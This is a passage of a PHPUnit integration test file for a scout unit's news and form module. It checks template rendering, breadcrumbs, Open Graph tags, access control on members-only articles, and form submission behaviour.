<?php

declare(strict_types=1);

namespace Tests\Modules\News\Controller;

use Core\Badge\MemberBadgeRepository;
use Core\Config\ScoutYearService;
use Core\Config\SettingRepository;
use Core\Config\SettingService;
use Core\Database\Connection;
use Core\File\FileRepository;
use Core\File\UploadHandler;
use Core\Http\Request;
use Core\Import\MemberYearRepository;
use Core\Journal\JournalService;
use Core\Mail\MailService;
use Core\Member\MemberService;
use Core\Member\SectionService;
use Core\Pdf\PosterPdfService;
use Core\Scheduler\SchedulerRepository;
use Core\Scheduler\SchedulerService;
use Core\Security\AuthSession;
use Core\Security\CsrfGuard;
use Core\Security\EncryptionService;
use Core\Security\Role;
use Core\Security\RoleResolver;
use Core\Security\UserAccountRepository;
use Core\Url\ShortUrlRepository;
use Core\Url\ShortUrlService;
use Core\View\EditableContentRepository;
use Core\View\EditableContentService;
use Core\View\TwigFactory;
use Modules\Finance\Api\FinanceAccountInterface;
use Modules\News\Controller\FormController;
use Modules\News\Controller\NewsController;
use Modules\News\Repository\Article;
use Modules\News\Repository\ArticleRepository;
use Modules\News\Repository\FormField;
use Modules\News\Repository\FormFieldRepository;
use Modules\News\Repository\FormRepository;
use Modules\News\Repository\FormResponseRepository;
use Modules\News\Repository\NewsForm;
use Modules\News\Service\ArticleService;
use Modules\News\Service\FormService;
use Modules\News\Service\ResponseService;
use Modules\News\Service\SeoKeywordService;
use PHPUnit\Framework\TestCase;
use Tests\DatabaseTestHelper;
use Tests\Modules\News\NewsTestHelper;
use Twig\Environment;

/**
 * End-to-end controller tests rendering the REAL templates (not stubs),
 * so a Twig runtime error (undefined filter/method/property) fails here
 * rather than only being caught manually in a browser.
 *
 * @group database
 */
#[\PHPUnit\Framework\Attributes\Group('database')]
class NewsIntegrationTest extends TestCase
{
    private \PDO $pdo;
    private EncryptionService $encryption;
    private NewsController $newsController;
    private FormController $formController;
    private ArticleRepository $articleRepository;
    private FormRepository $formRepository;
    private FormFieldRepository $fieldRepository;
    private FormResponseRepository $responseRepository;
    private int $chiefAccountId;
    private ArticleService $articleService;
    private FormService $formService;
    private ResponseService $responseService;
    private Environment $twig;
    private ScoutYearService $scoutYearService;
    private SettingService $settingService;
    private SchedulerService $schedulerService;
    private UserAccountRepository $userAccountRepository;
    private MemberService $memberService;
    private SectionService $sectionService;
    private JournalService $journalService;
    private EditableContentService $editableContentService;

    protected function setUp(): void
    {
        $this->pdo = DatabaseTestHelper::createTestDatabase();
        NewsTestHelper::createTables($this->pdo);
        $this->encryption = new EncryptionService(str_repeat('a', 32), str_repeat('b', 32));

        $stmt = $this->pdo->prepare('INSERT INTO user_accounts (email_encrypted, email_blind_index) VALUES (?, ?)');
        $stmt->execute([$this->encryption->encrypt('chief@test.com', 'user_accounts.email'), $this->encryption->blindIndex('chief@test.com', 'email')]);
        $this->chiefAccountId = (int) $this->pdo->lastInsertId();

        $this->articleRepository = new ArticleRepository($this->pdo);
        $this->formRepository = new FormRepository($this->pdo);
        $this->fieldRepository = new FormFieldRepository($this->pdo);
        $this->responseRepository = new FormResponseRepository($this->pdo, $this->encryption);

        $editableContentService = new EditableContentService(new EditableContentRepository($this->pdo));
        $shortUrlService = new ShortUrlService(new ShortUrlRepository($this->pdo, new \Core\Security\EncryptionService(str_repeat('a', 32), str_repeat('b', 32))));
        $articleService = new ArticleService($this->articleRepository, $this->formRepository, $editableContentService, $shortUrlService);
        $formService = new FormService($this->formRepository, $this->fieldRepository, $articleService);
        $this->articleService = $articleService;
        $this->formService = $formService;
        $this->editableContentService = $editableContentService;

        $connection = Connection::withPdo($this->pdo);
        $roleResolver = new RoleResolver(new MemberYearRepository($this->pdo), $this->encryption, $this->pdo);
        $sectionService = new SectionService($connection, $this->encryption, new MemberBadgeRepository($this->pdo));
        $this->sectionService = $sectionService;
        $mailService = $this->createMock(MailService::class);

        $templateDir = dirname(__DIR__, 4) . '/core/View/templates';
        $moduleViews = dirname(__DIR__, 4) . '/modules/news/views';
        $twig = TwigFactory::create($templateDir, false, ['news' => $moduleViews]);
        $twig->addGlobal('site_name', 'Test Unit');
        $twig->addGlobal('is_authenticated', false);
        $twig->addGlobal('current_user_role', 'public');
        $twig->addGlobal('config_mode', false);
        $twig->addGlobal('cookie_consent_given', true);
        $twig->addGlobal('menus', null);
        $twig->addGlobal('current_path', '/news');
        $this->twig = $twig;

        $responseService = new ResponseService(
            $this->responseRepository, $roleResolver, $sectionService, $mailService, $twig, $shortUrlService,
            'https://example.com', 'Test Unit'
        );
        $this->responseService = $responseService;

        $settingService = new SettingService(new SettingRepository($this->pdo));
        $scoutYearService = new ScoutYearService($this->pdo);
        $schedulerService = new SchedulerService(new SchedulerRepository($this->pdo));
        $userAccountRepository = new UserAccountRepository($this->pdo, $this->encryption);
        $this->settingService = $settingService;
        $this->scoutYearService = $scoutYearService;
        $this->schedulerService = $schedulerService;
        $this->userAccountRepository = $userAccountRepository;

        $memberService = new MemberService(new MemberYearRepository($this->pdo), $this->encryption, $connection);
        $this->memberService = $memberService;

        $uploadHandler = new UploadHandler(new FileRepository($this->pdo), sys_get_temp_dir());
        $journalService = $this->createMock(JournalService::class);
        $this->journalService = $journalService;

        $this->newsController = new NewsController(
            $twig, $articleService, $formService, $responseService, new SeoKeywordService(null),
            new PosterPdfService(), $scoutYearService, $settingService, $schedulerService, $userAccountRepository,
            $memberService, $sectionService, $uploadHandler, new FileRepository($this->pdo), sys_get_temp_dir(), $journalService
        );
        $this->formController = new FormController($twig, $articleService, $formService, $responseService, $scoutYearService, $journalService);

        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }
        $_SESSION = [];
    }

    protected function tearDown(): void
    {
        AuthSession::logout();
        unset($_FILES['image']);
    }

    public function testPublicListRendersWithNoArticles(): void
    {
        $response = $this->newsController->index(new Request('GET', '/news', [], [], [], []), []);
        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('Aucune actualité', $response->getBody());
    }

    public function testPublicListRendersAnArticleCard(): void
    {
        $this->articleRepository->create('Camp ete', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);

        $response = $this->newsController->index(new Request('GET', '/news', [], [], [], []), []);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('Camp ete', $response->getBody());
    }

    public function testPublicListNeverShowsDirectLinkArticles(): void
    {
        $this->articleRepository->create('Secret', Article::VISIBILITY_DIRECT_LINK, false, null, null, $this->chiefAccountId);

        $response = $this->newsController->index(new Request('GET', '/news', [], [], [], []), []);

        $this->assertStringNotContainsString('Secret', $response->getBody());
    }

    public function testManageListRendersForChief(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $this->articleRepository->create('Article', Article::VISIBILITY_CHIEF, false, null, null, $this->chiefAccountId);

        $response = $this->newsController->manage(new Request('GET', '/news/manage', [], [], [], []), []);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('Article', $response->getBody());
    }

    public function testCreateEditorPageRendersForChief(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        $response = $this->newsController->create(new Request('GET', '/news/create', [], [], [], []), []);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('Nouvel article', $response->getBody());
    }

    public function testEditEditorPageRendersWithAnExistingFormAndFields(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleRepository->create('Article avec formulaire', Article::VISIBILITY_PUBLIC, true, 'mots,cles', '2027-01-01', $this->chiefAccountId);
        $this->articleRepository->setShortUrlCode($articleId, 'abc123');
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_IDENTIFIED, NewsForm::RESPONSE_LIMIT_ONE_PER_ACCOUNT, '2026-01-01', '2026-12-31', false, 'chief', true, null);
        $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
        $this->fieldRepository->create($formId, 1, FormField::TYPE_NUMBER, 'Places', false, null, null, 20, null, null);
        $this->fieldRepository->create($formId, 2, FormField::TYPE_DROPDOWN, 'Jour', false, 'manual', "Lundi\nMardi", null, null, null);
        $this->fieldRepository->create($formId, 3, FormField::TYPE_CONFIRMATION, null, false, null, null, null, null, 'Je confirme.');

        $response = $this->newsController->edit(new Request('GET', '/news/' . $articleId . '/edit', [], [], [], []), ['id' => (string) $articleId]);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('Article avec formulaire', $response->getBody());
        $this->assertStringContainsString('abc123', $response->getBody());
    }

    /**
     * Mirrors testShowSetsBreadcrumbCurrentToTheArticleTitle — the edit
     * page's breadcrumb also shows the real article title, not the
     * route's static "Modifier l'article" label.
     */
    public function testEditEditorPageSetsBreadcrumbCurrentToTheArticleTitle(): void
    {
        $this->twig->addGlobal('route_breadcrumb', ['label' => "Modifier l'article", 'parents' => ['Espace animateurs']]);
        $this->twig->addGlobal('menus', [['id' => 'espace_chefs', 'label' => 'Espace animateurs']]);
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleRepository->create('Fête des familles', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);

        $response = $this->newsController->edit(new Request('GET', '/news/' . $articleId . '/edit', [], [], [], []), ['id' => (string) $articleId]);

        $this->assertMatchesRegularExpression(
            '/aria-current="page">\s*Fête des familles\s*</',
            $response->getBody()
        );
    }

    /**
     * create() passes no article ($article = null in editorContext()) —
     * breadcrumb_current stays unset, so the breadcrumb bar falls back to
     * the route's own static breadcrumb.label ("Nouvel article", see
     * module.json) rather than erroring or showing an empty string.
     */
    public function testCreateEditorPageBreadcrumbFallsBackToTheStaticLabelSinceThereIsNoArticleYet(): void
    {
        $this->twig->addGlobal('route_breadcrumb', ['label' => 'Nouvel article', 'parents' => ['Espace animateurs']]);
        $this->twig->addGlobal('menus', [['id' => 'espace_chefs', 'label' => 'Espace animateurs']]);
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        $response = $this->newsController->create(new Request('GET', '/news/create', [], [], [], []), []);

        $this->assertMatchesRegularExpression(
            '/aria-current="page">\s*Nouvel article\s*</',
            $response->getBody()
        );
    }

    public function testEditEditorPreviewTabRendersWithAnExistingFormAndFields(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleRepository->create('Article preview', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_IDENTIFIED, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
        $this->fieldRepository->create($formId, 0, FormField::TYPE_NUMBER, 'Repas', false, null, null, 10, null, null);

        $response = $this->newsController->edit(new Request('GET', '/news/' . $articleId . '/edit', ['tab' => 'preview'], [], [], []), ['id' => (string) $articleId]);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('Aperçu', $response->getBody());
    }

    public function testCreatePageDefaultsFinanceAccountToTheCurrentUsersSection(): void
    {
        $this->pdo->exec("INSERT INTO age_branches (desk_code, label, sort_order) VALUES ('LOU', 'Louveteaux', 1)");
        $branchId = (int) $this->pdo->lastInsertId();
        $this->pdo->exec("INSERT INTO sections (desk_code, age_branch_id, name) VALUES ('LOU01', {$branchId}, 'Meute A')");
        $sectionId = (int) $this->pdo->lastInsertId();
        $this->pdo->exec("INSERT INTO scout_years (label, start_date, end_date, is_current) VALUES ('2025-2026', '2025-09-01', '2026-08-31', 1)");
        $scoutYearId = (int) $this->pdo->lastInsertId();

        $this->pdo->exec("INSERT INTO members (desk_id) VALUES ('DESK_1')");
        $memberId = (int) $this->pdo->lastInsertId();
        $this->pdo->exec("INSERT INTO functions (desk_code, label, role, confirmed) VALUES ('Animateur', 'Animateur', 'chief', 1)");
        $functionId = (int) $this->pdo->lastInsertId();

        $blindIndex = $this->encryption->blindIndex('chief@test.com', 'email');
        $stmt = $this->pdo->prepare(
            'INSERT INTO member_years (member_id, scout_year_id, first_name_encrypted, last_name_encrypted, email_encrypted, email_blind_index)
             VALUES (?, ?, ?, ?, ?, ?)'
        );
        $stmt->execute([$memberId, $scoutYearId, $this->encryption->encrypt('Chef', 'member_years.first_name'), $this->encryption->encrypt('Test', 'member_years.last_name'), $this->encryption->encrypt('chief@test.com', 'member_years.email'), $blindIndex]);
        $memberYearId = (int) $this->pdo->lastInsertId();

        $stmt = $this->pdo->prepare('INSERT INTO member_functions (member_year_id, function_id, section_id, is_main_function) VALUES (?, ?, ?, 1)');
        $stmt->execute([$memberYearId, $functionId, $sectionId]);

        $financeAccount = $this->createMock(FinanceAccountInterface::class);
        $financeAccount->method('getConfiguredAccounts')->willReturn([
            ['id' => 42, 'name' => 'Compte Meute A', 'iban' => null, 'holder_name' => null, 'section_id' => $sectionId],
        ]);
        $financeAccount->method('getDefaultAccountForSection')->with($sectionId)->willReturn(42);

        $controller = new NewsController(
            $this->twig, $this->articleService, $this->formService, $this->responseService, new SeoKeywordService(null),
            new PosterPdfService(), $this->scoutYearService, $this->settingService, $this->schedulerService, $this->userAccountRepository,
            $this->memberService, $this->sectionService, new UploadHandler(new FileRepository($this->pdo), sys_get_temp_dir()),
            new FileRepository($this->pdo), sys_get_temp_dir(), $this->journalService, $financeAccount
        );

        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $response = $controller->create(new Request('GET', '/news/create', [], [], [], []), []);

        $this->assertMatchesRegularExpression('/<option value="42"[^>]*selected[^>]*>Compte Meute A<\/option>/', $response->getBody());
    }

    public function testShowRendersArticleDetailWithoutForm(): void
    {
        $id = $this->articleRepository->create('Titre article', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);

        $response = $this->newsController->show(new Request('GET', '/news/' . $id, [], [], [], []), ['id' => (string) $id]);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('Titre article', $response->getBody());
        // No real input field (not even a saved form) — nothing to submit,
        // so the submission mechanics must not render (usability review).
        $this->assertStringNotContainsString('Envoyer', $response->getBody());
        $this->assertStringNotContainsString('contact_email', $response->getBody());
    }

    /**
     * The breadcrumb was previously empty on this page (module.json's
     * /news/{id} route declared no `breadcrumb` at all) — now declared,
     * with `breadcrumb_current` set to the real article title rather than
     * a static, uninformative label (same pattern as MemberController).
     */
    public function testShowSetsBreadcrumbCurrentToTheArticleTitle(): void
    {
        $this->twig->addGlobal('route_breadcrumb', ['label' => 'Actualité', 'parents' => ['Notre unité']]);
        $this->twig->addGlobal('menus', [['id' => 'notre_unite', 'label' => 'Notre unité']]);

        $id = $this->articleRepository->create('Camp d\'été 2026', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);

        $response = $this->newsController->show(new Request('GET', '/news/' . $id, [], [], [], []), ['id' => (string) $id]);

        $this->assertStringContainsString('aria-current="page"', $response->getBody());
        $this->assertMatchesRegularExpression(
            '/aria-current="page">\s*Camp d&#039;été 2026\s*</',
            $response->getBody()
        );
    }

    public function testShowMigratesLegacyBodyHtmlIntoContentWhenArticlePredatesTheMandatoryForm(): void
    {
        $id = $this->articleRepository->create('Ancien article', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
        // Simulates an article saved before the form became mandatory —
        // content lived in the generic editable-content store, no
        // news_forms row exists at all.
        $this->editableContentService->set(ArticleService::bodyContentKey($id), '<p>Contenu historique de l\'article.</p>', 'rich_text', $this->chiefAccountId);

        $response = $this->newsController->show(new Request('GET', '/news/' . $id, [], [], [], []), ['id' => (string) $id]);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('Contenu historique de l\'article.', $response->getBody());
        $this->assertStringNotContainsString('Envoyer', $response->getBody());
    }

    public function testEditEditorPageMigratesLegacyBodyHtmlIntoADefaultTextField(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $id = $this->articleRepository->create('Ancien article', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
        $this->editableContentService->set(ArticleService::bodyContentKey($id), '<p>Contenu historique.</p>', 'rich_text', $this->chiefAccountId);

        $response = $this->newsController->edit(new Request('GET', '/news/' . $id . '/edit', [], [], [], []), ['id' => (string) $id]);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('Contenu historique.', $response->getBody());
    }

    public function testCreateEditorPageHasNoAddFormCheckboxAndFieldsBoxIsCalledArticle(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');

        $response = $this->newsController->create(new Request('GET', '/news/create', [], [], [], []), []);
        $body = $response->getBody();

        // Only the default "bloc de texte" exists — the fields box reads
        // "Article" (JS renames it to "Formulaire" once a real input field
        // is added), and there's no "Accès au formulaire" control anymore.
        $this->assertStringContainsString('id="news-form-box-heading">Article<', $body);
        $this->assertStringNotContainsString('id="has_form"', $body);
        $this->assertStringNotContainsString('Ajouter un formulaire', $body);
        $this->assertStringNotContainsString('Accès au formulaire', $body);
        $this->assertStringNotContainsString('name="form_access"', $body);
    }

    public function testShowRendersOpenGraphAndTwitterCardMetaTagsWithAbsoluteImageUrl(): void
    {
        $id = $this->articleRepository->create('Camp d\'ete 2026', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
        $this->articleRepository->update($id, 'Camp d\'ete 2026', Article::VISIBILITY_PUBLIC, false, null, null, 'Un super camp cet ete !', 55);
        $this->articleRepository->setShortUrlCode($id, 'abc123');
        $this->settingService->register('base_url', 'https://example.test', 'text', 'label', 'desc');

        $response = $this->newsController->show(new Request('GET', '/news/' . $id, [], [], [], []), ['id' => (string) $id]);
        $body = $response->getBody();

        $this->assertStringContainsString('property="og:title" content="Camp d', $body);
        $this->assertStringContainsString('property="og:description" content="Un super camp cet ete !"', $body);
        $this->assertStringContainsString('property="og:url" content="https://example.test/s/abc123"', $body);
        $this->assertStringContainsString('property="og:image" content="https://example.test/files/55"', $body);
        $this->assertStringContainsString('name="twitter:card" content="summary_large_image"', $body);
    }

    /**
     * The visibility check is a server-side boundary, not a listing
     * filter (SECURITY.md §3): hiding the article from /news does not
     * protect it, refusing /news/{id} does.
     */
    public function testShowReturns403ForIdentifiedArticleWhenAnonymous(): void
    {
        $id = $this->articleRepository->create('Membres', Article::VISIBILITY_IDENTIFIED, false, null, null, $this->chiefAccountId);

        $response = $this->newsController->show(new Request('GET', '/news/' . $id, [], [], [], []), ['id' => (string) $id]);

        $this->assertSame(403, $response->getStatusCode());
    }

    public function testShowRendersIdentifiedArticleForASignedInMember(): void
    {
        AuthSession::login($this->chiefAccountId, 'parent@test.com', 'identified');
        $id = $this->articleRepository->create('Membres', Article::VISIBILITY_IDENTIFIED, false, null, null, $this->chiefAccountId);

        $response = $this->newsController->show(new Request('GET', '/news/' . $id, [], [], [], []), ['id' => (string) $id]);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertStringContainsString('Membres', $response->getBody());
    }

    public function testPublicListHidesIdentifiedArticleFromAnAnonymousVisitorAndShowsItToAMember(): void
    {
        $this->articleRepository->create('Reserve aux membres', Article::VISIBILITY_IDENTIFIED, false, null, null, $this->chiefAccountId);

        $anonymous = $this->newsController->index(new Request('GET', '/news', [], [], [], []), []);
        $this->assertStringNotContainsString('Reserve aux membres', $anonymous->getBody());

        AuthSession::login($this->chiefAccountId, 'parent@test.com', 'identified');
        $member = $this->newsController->index(new Request('GET', '/news', [], [], [], []), []);
        $this->assertStringContainsString('Reserve aux membres', $member->getBody());
    }

    /**
     * The decision recorded in schema.sql and in the module spec: the
     * body of a members-only article is protected by the 403 above, and
     * its PREVIEW has to be protected too — otherwise a link pasted into
     * a public group renders the title, the summary and the cover image
     * for everyone.
     */
    public function testIdentifiedArticleExposesNoOpenGraphMetadataEvenToAReaderWhoMaySeeIt(): void
    {
        AuthSession::login($this->chiefAccountId, 'parent@test.com', 'identified');
        $id = $this->articleRepository->create('Camp reserve', Article::VISIBILITY_IDENTIFIED, false, null, null, $this->chiefAccountId);
        $this->articleRepository->update($id, 'Camp reserve', Article::VISIBILITY_IDENTIFIED, false, null, null, 'Un secret de famille.', 55);
        $this->settingService->register('base_url', 'https://example.test', 'text', 'label', 'desc');

        $body = $this->newsController->show(new Request('GET', '/news/' . $id, [], [], [], []), ['id' => (string) $id])->getBody();

        $this->assertStringNotContainsString('property="og:', $body);
        $this->assertStringNotContainsString('name="twitter:', $body);
        $this->assertStringContainsString('name="robots" content="noindex"', $body);
    }

    public function testShowReturns403ForChiefArticleWhenPublic(): void
    {
        $id = $this->articleRepository->create('Réservé', Article::VISIBILITY_CHIEF, false, null, null, $this->chiefAccountId);

        $response = $this->newsController->show(new Request('GET', '/news/' . $id, [], [], [], []), ['id' => (string) $id]);

        $this->assertSame(403, $response->getStatusCode());
    }

    public function testShowRendersOpenFormAndAcceptsASubmission(): void
    {
        $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
        $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);

        $showResponse = $this->newsController->show(new Request('GET', '/news/' . $articleId, [], [], [], []), ['id' => (string) $articleId]);
        $this->assertStringContainsString('Envoyer', $showResponse->getBody());
        $this->assertStringContainsString('field_' . $fieldId, $showResponse->getBody());

        $csrfToken = CsrfGuard::generateToken();
        $submitRequest = new Request('POST', '/news/' . $articleId . '/form/submit', [], [
            '_csrf_token' => $csrfToken,
            'contact_email' => 'parent@test.com',
            'field_' . $fieldId => 'Alice',
        ], [], []);

        $confirmationResponse = $this->formController->submit($submitRequest, ['id' => (string) $articleId]);

        $this->assertSame(200, $confirmationResponse->getStatusCode());
        $this->assertStringContainsString('Votre réponse a été enregistrée', $confirmationResponse->getBody());
        $this->assertSame(1, (int) $this->pdo->query('SELECT COUNT(*) FROM news_form_responses')->fetchColumn());
    }

    /**
     * A capped number field must render `max="2"` — a real HTML number, not
     * a string that merely looks like one.
     *
     * The attribute used to be built as a Twig expression
     * (`'max="' ~ remaining_capacity ~ '"'`), which autoescaping turned
     * into `max=&quot;2&quot;`; an HTML parser reads that back as an
     * UNQUOTED value of `"2"`, so the browser had a max it could not
     * interpret and enforced no cap at all. The regression is invisible to
     * an assertion on the rendered text ("Il reste 2 places" was always
     * right) and was found by driving the form in a real browser
     * (tests/e2e/specs/news-form-payment.spec.js).
     */
    public function testCappedNumberFieldRendersARealMaxAttribute(): void
    {
        $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
        $this->fieldRepository->create($formId, 0, FormField::TYPE_NUMBER, 'Places', true, null, null, 2, null, null);

        $body = $this->newsController->show(
            new Request('GET', '/news/' . $articleId, [], [], [], []),
            ['id' => (string) $articleId]
        )->getBody();

        $this->assertStringContainsString('max="2"', $body);
        $this->assertStringNotContainsString('max=&quot;', $body);
        $this->assertStringContainsString('Il reste 2 places', $body);
    }

    /**
     * When a required capped field's quota is exhausted, the page must
     * keep the field's label but replace the greyed-out input with a
     * "Complet" notice — a disabled input is never submitted by the
     * browser, so a disabled+required one made the WHOLE form
     * unsubmittable for everyone (the server saw the required answer as
     * empty and refused). The remaining fields must still submit fine.
     */
    public function testFullRequiredNumberFieldRendersAsCompletAndTheFormStillSubmits(): void
    {
        $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
        $placesId = $this->fieldRepository->create($formId, 0, FormField::TYPE_NUMBER, 'Places bus', true, null, null, 2, null, null);
        $nameId = $this->fieldRepository->create($formId, 1, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
        $this->responseRepository->create($formId, null, null, 'x@test.com', [$placesId => '2'], null, null);

        $body = $this->newsController->show(new Request('GET', '/news/' . $articleId, [], [], [], []), ['id' => (string) $articleId])->getBody();

        $this->assertStringContainsString('Places bus', $body, 'the label must stay visible');
        $this->assertStringContainsString("Complet — cette option n'est plus proposée.", $body);
        $this->assertStringNotContainsString('name="field_' . $placesId . '"', $body, 'no disabled+required input for a full field');

        $submitRequest = new Request('POST', '/news/' . $articleId . '/form/submit', [], [
            '_csrf_token' => CsrfGuard::generateToken(),
            'contact_email' => 'parent@test.com',
            'field_' . $nameId => 'Alice',
        ], [], []);

        $confirmation = $this->formController->submit($submitRequest, ['id' => (string) $articleId]);

        $this->assertSame(200, $confirmation->getStatusCode());
        $this->assertStringContainsString('Votre réponse a été enregistrée', $confirmation->getBody());
    }

    /**
     * A rejected submission re-renders the form — and must hand the
     * visitor back everything they typed (rerenderFormWithError), not a
     * blank form: text values (escaped), checked checkboxes, and the
     * posted contact email.
     */
    public function testSubmitErrorRedisplayKeepsThePostedValues(): void
    {
        $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
        $nameId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
        $daysId = $this->fieldRepository->create($formId, 1, FormField::TYPE_CHECKBOX, 'Jours', false, FormField::OPTIONS_SOURCE_MANUAL, "Lundi\nMardi", null, null, null);
        $emailId = $this->fieldRepository->create($formId, 2, FormField::TYPE_EMAIL, 'Email parent', true, null, null, null, null, null);

        $request = new Request('POST', '/news/' . $articleId . '/form/submit', [], [
            '_csrf_token' => CsrfGuard::generateToken(),
            'contact_email' => 'famille@test.com',
            'field_' . $nameId => 'Bob <Marchand>',
            'field_' . $daysId => ['Lundi'],
            // Invalid on the server → NewsException → error re-render.
            'field_' . $emailId => 'pas-un-email',
        ], [], []);

        $response = $this->formController->submit($request, ['id' => (string) $articleId]);
        $body = $response->getBody();

        $this->assertSame(422, $response->getStatusCode());
        $this->assertStringContainsString('doit être une adresse email valide', $body);
        $this->assertStringContainsString('value="Bob &lt;Marchand&gt;"', $body, 'text answer kept, HTML-escaped');
        $this->assertMatchesRegularExpression('/value="Lundi"\s+checked/', $body, 'checkbox answer kept');
        $this->assertDoesNotMatchRegularExpression('/value="Mardi"\s+checked/', $body, 'unchecked option stays unchecked');
        $this->assertStringContainsString('value="pas-un-email"', $body, 'the offending value is shown for correction');
        $this->assertStringContainsString('name="contact_email" value="famille@test.com"', $body);
    }

    public function testSubmitRejectsClosedFormAndRedisplaysArticle(): void
    {
        $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, true, 'chief', false, null);
        // A form with zero real input fields has nothing to submit, so the
        // "closed" messaging only renders once there's at least one.
        $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);

        $csrfToken = CsrfGuard::generateToken();
        $request = new Request('POST', '/news/' . $articleId . '/form/submit', [], [
            '_csrf_token' => $csrfToken,
            'contact_email' => 'parent@test.com',
        ], [], []);

        $response = $this->formController->submit($request, ['id' => (string) $articleId]);

        $this->assertSame(422, $response->getStatusCode());
        $this->assertStringContainsString('fermé', $response->getBody());
    }

    /**
     * The error re-render (@news/detail.html.twig, same template show()
     * itself renders) must carry the same breadcrumb_current as a normal
     * GET /news/{id} — a validation error must not silently drop it.
     */
    public function testSubmitErrorRedisplayKeepsBreadcrumbCurrentAsTheArticleTitle(): void
    {
        $this->twig->addGlobal('route_breadcrumb', ['label' => 'Actualité', 'parents' => ['Notre unité']]);
        $this->twig->addGlobal('menus', [['id' => 'notre_unite', 'label' => 'Notre unité']]);

        $articleId = $this->articleRepository->create('Sortie Ardennes', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, true, 'chief', false, null);
        $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);

        $request = new Request('POST', '/news/' . $articleId . '/form/submit', [], [
            '_csrf_token' => CsrfGuard::generateToken(),
            'contact_email' => 'parent@test.com',
        ], [], []);

        $response = $this->formController->submit($request, ['id' => (string) $articleId]);

        $this->assertSame(422, $response->getStatusCode());
        $this->assertMatchesRegularExpression(
            '/aria-current="page">\s*Sortie Ardennes\s*</',
            $response->getBody()
        );
    }

    public function testResponsesPageRendersForChiefAndListsSubmission(): void
    {
        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
        $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
        $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
        $this->responseRepository->create($formId, null, null, 'parent@test.com', [$fieldId => 'Alice'], null, null);

        $response = $this->formController->responses(new Request('GET', '/news/' . $articleId . '/form/responses', [], [], [], []), ['id' => (string) $articleId]);

        $this->assertSame(200, $response->getStatusCode());
